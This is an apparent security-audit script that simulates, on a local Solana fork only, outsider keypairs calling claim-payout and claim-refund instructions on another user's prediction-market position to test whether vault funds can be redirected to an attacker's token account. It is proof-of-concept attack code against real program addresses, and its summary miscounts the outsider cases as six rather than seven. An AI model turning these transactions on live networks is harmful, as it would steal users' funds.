#!/usr/bin/env node
'use strict';

// Read-only local-fork simulations. No transaction is submitted to mainnet or the fork.
const fs = require('fs');
const modules = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/';
const {PublicKey, Keypair, TransactionInstruction, TransactionMessage, VersionedTransaction,
  SystemProgram} = require(modules + '@solana/web3.js');
const {TOKEN_PROGRAM_ID, getAssociatedTokenAddressSync,
  createAssociatedTokenAccountIdempotentInstruction} = require(modules + '@solana/spl-token');

const endpoint = process.env.JUPUSD_FORK_RPC || 'http://127.0.0.1:9497';
const program = new PublicKey('3ZZuTbwC6aJbvteyVxXUS7gtFYdf7AuXeitx6VyvjvUp');
const vault = new PublicKey('2y9Ad2GD7gwiMkkMu4bBK5216Pv9YJsBkSHAGwN3rBuJ');
const vaultToken = new PublicKey('8zNYCcMUSm4JgTCAYp9JQCAth5Dx8BotpTNcRWGZJnfy');
const mint = new PublicKey('JuprjznTrTSp2UFa3ZBUFgwdAmtZCq4MQCwysN55USD');
const fixture = {
  position: new PublicKey('9nZ1VUEvGC7TtFdAMPHHmZhEaqEXrv4aMaqkuUeeHtEH'),
  owner: new PublicKey('5tYTBBhDbaKw9eJokNLNjtqm4sKworubxvsBWUgrZpLv'),
  marketResult: new PublicKey('3SYABE4TrhwT9BhYcp9gpoVjvdepKY9cAFh6qNhQDo82'),
  contractsRaw: '759870000',
  marketId: 'df233ad7567c7530364453bde905a35b'
};
const secondPosition = new PublicKey('C5JUCkJdvgsBNzBkS52X1KPNXtVz9gZVhDEJoYCfm5QC');
const claimPayout = Buffer.from([127, 240, 132, 62, 227, 198, 146, 133]);
const claimPayout2 = Buffer.from([141, 205, 99, 203, 142, 231, 87, 226]);
const claimRefund = Buffer.from([15, 16, 30, 161, 255, 228, 97, 60]);
let rpcId = 0;
async function rpc(method, params) {
  const response = await fetch(endpoint, {method: 'POST', headers: {'content-type': 'application/json'},
    body: JSON.stringify({jsonrpc: '2.0', id: ++rpcId, method, params})});
  const json = await response.json();
  if (json.error) throw new Error(`${method}: ${JSON.stringify(json.error)}`);
  return json.result;
}
function tokenAmount(account) {
  if (!account?.data?.[0]) return null;
  const data = Buffer.from(account.data[0], 'base64');
  return data.length >= 72 ? data.readBigUInt64LE(64).toString() : null;
}
async function simulate({label, signer, owner, position, destination, discriminator, createDestination, sigVerify}) {
  const keys = [
    {pubkey: owner, isSigner: true, isWritable: false},
    {pubkey: vault, isSigner: false, isWritable: true},
    {pubkey: position, isSigner: false, isWritable: true},
    {pubkey: fixture.marketResult, isSigner: false, isWritable: false},
    {pubkey: destination, isSigner: false, isWritable: true},
    {pubkey: vaultToken, isSigner: false, isWritable: true},
    {pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false}
  ];
  const target = new TransactionInstruction({programId: program, keys, data: discriminator});
  const instructions = createDestination
    ? [createAssociatedTokenAccountIdempotentInstruction(signer.publicKey, destination, signer.publicKey, mint), target]
    : [target];
  const blockhash = (await rpc('getLatestBlockhash', [{commitment: 'processed'}])).value.blockhash;
  const message = new TransactionMessage({payerKey: signer.publicKey, recentBlockhash: blockhash,
    instructions}).compileToV0Message();
  const tx = new VersionedTransaction(message);
  tx.sign([signer]);
  const wire = Buffer.from(tx.serialize());
  const watched = [vaultToken.toBase58(), destination.toBase58(), position.toBase58()];
  const before = await rpc('getMultipleAccounts', [watched, {encoding: 'base64', commitment: 'processed'}]);
  const sim = await rpc('simulateTransaction', [wire.toString('base64'), {encoding: 'base64', sigVerify,
    replaceRecentBlockhash: false, commitment: 'processed',
    accounts: {encoding: 'base64', addresses: watched}}]);
  return {label, sigVerify, bytes: wire.length, inlineAccountKeys: message.staticAccountKeys.length,
    err: sim.value.err, unitsConsumed: sim.value.unitsConsumed,
    before: {vaultTokenRaw: tokenAmount(before.value[0]), destinationRaw: tokenAmount(before.value[1])},
    after: {vaultTokenRaw: tokenAmount(sim.value.accounts?.[0]), destinationRaw: tokenAmount(sim.value.accounts?.[1])},
    logs: sim.value.logs};
}

async function main() {
  const attacker = Keypair.generate();
  const attackerAta = getAssociatedTokenAddressSync(mint, attacker.publicKey, false, TOKEN_PROGRAM_ID);
  const ownerAta = getAssociatedTokenAddressSync(mint, fixture.owner, false, TOKEN_PROGRAM_ID);
  await rpc('surfnet_setAccount', [attacker.publicKey.toBase58(), {data: '', executable: false,
    lamports: 1_000_000_000, owner: SystemProgram.programId.toBase58(), rentEpoch: 0}]);
  await rpc('getMultipleAccounts', [[program, vault, vaultToken, fixture.position, secondPosition,
    fixture.marketResult, fixture.owner, ownerAta, mint, TOKEN_PROGRAM_ID].map(x => x.toBase58()),
    {encoding: 'base64', commitment: 'processed'}]);

  // Signature-valid outsider cases.
  const cases = [
    {label: 'claim_payout_outsider_original_destination', signer: attacker, owner: attacker.publicKey,
      position: fixture.position, destination: ownerAta, discriminator: claimPayout, createDestination: false, sigVerify: true},
    {label: 'claim_payout_outsider_attacker_destination', signer: attacker, owner: attacker.publicKey,
      position: fixture.position, destination: attackerAta, discriminator: claimPayout, createDestination: true, sigVerify: true},
    {label: 'claim_payout_outsider_second_position_alias', signer: attacker, owner: attacker.publicKey,
      position: secondPosition, destination: attackerAta, discriminator: claimPayout, createDestination: true, sigVerify: true},
    {label: 'claim_payout2_outsider_original_destination', signer: attacker, owner: attacker.publicKey,
      position: fixture.position, destination: ownerAta, discriminator: claimPayout2, createDestination: false, sigVerify: true},
    {label: 'claim_payout2_outsider_attacker_destination', signer: attacker, owner: attacker.publicKey,
      position: fixture.position, destination: attackerAta, discriminator: claimPayout2, createDestination: true, sigVerify: true},
    {label: 'claim_refund_outsider_original_destination', signer: attacker, owner: attacker.publicKey,
      position: fixture.position, destination: ownerAta, discriminator: claimRefund, createDestination: false, sigVerify: true},
    {label: 'claim_refund_outsider_attacker_destination', signer: attacker, owner: attacker.publicKey,
      position: fixture.position, destination: attackerAta, discriminator: claimRefund, createDestination: true, sigVerify: true}
  ];
  const results = [];
  for (const c of cases) results.push(await simulate(c));
  results.push(await simulate({label: 'claim_payout_live_fixture_positive_control', signer: attacker,
    owner: fixture.owner, position: fixture.position, destination: ownerAta,
    discriminator: claimPayout, createDestination: false, sigVerify: false}));
  const output = {generatedAt: new Date().toISOString(), endpoint, program: program.toBase58(),
    fixture: {...fixture, position: fixture.position.toBase58(), owner: fixture.owner.toBase58(),
      marketResult: fixture.marketResult.toBase58(), ownerAta: ownerAta.toBase58()},
    attacker: attacker.publicKey.toBase58(), attackerAta: attackerAta.toBase58(),
    signatureMode: 'six outsider cases use sigVerify:true; live-fixture positive control uses sigVerify:false',
    mainnetSubmitted: false, forkSubmitted: false, results};
  fs.writeFileSync(`${__dirname}/jupusd-prediction-claim-mutations.json`, JSON.stringify(output, null, 2) + '\n');
  console.log(JSON.stringify(results.map(r => ({label: r.label, err: r.err, bytes: r.bytes,
    keys: r.inlineAccountKeys, units: r.unitsConsumed,
    errorLog: r.logs?.find(x => /Error|error|failed/.test(x))})), null, 2));
}
main().catch(error => { console.error(error.stack || error); process.exitCode = 1; });
